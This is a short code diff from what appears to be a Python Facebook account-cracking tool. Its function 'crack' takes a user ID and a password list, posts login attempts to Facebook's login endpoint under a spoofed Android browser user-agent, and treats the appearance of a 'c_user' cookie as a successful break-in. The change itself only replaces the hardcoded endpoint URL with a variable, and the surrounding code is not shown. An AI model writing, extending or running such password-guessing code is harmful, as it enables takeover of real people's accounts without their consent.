@@ -315,7 +315,7 @@ def crack(uid, password_list, total_count):
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
             'user-agent': 'Mozilla/5.0 (Linux; Android 13; RMX3241) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',}
-            respon = Session.post('https://p.facebook.com/async/wbloks/fetch/',params=params,data=log_data,cookies=cookies,headers=headers,allow_redirects=False)
+            respon = Session.post(url,params=params,data=log_data,cookies=cookies,headers=headers,allow_redirects=False)
             log_cookies = Session.cookies.get_dict().keys()
             # Check response
             if "c_user" in log_cookies:
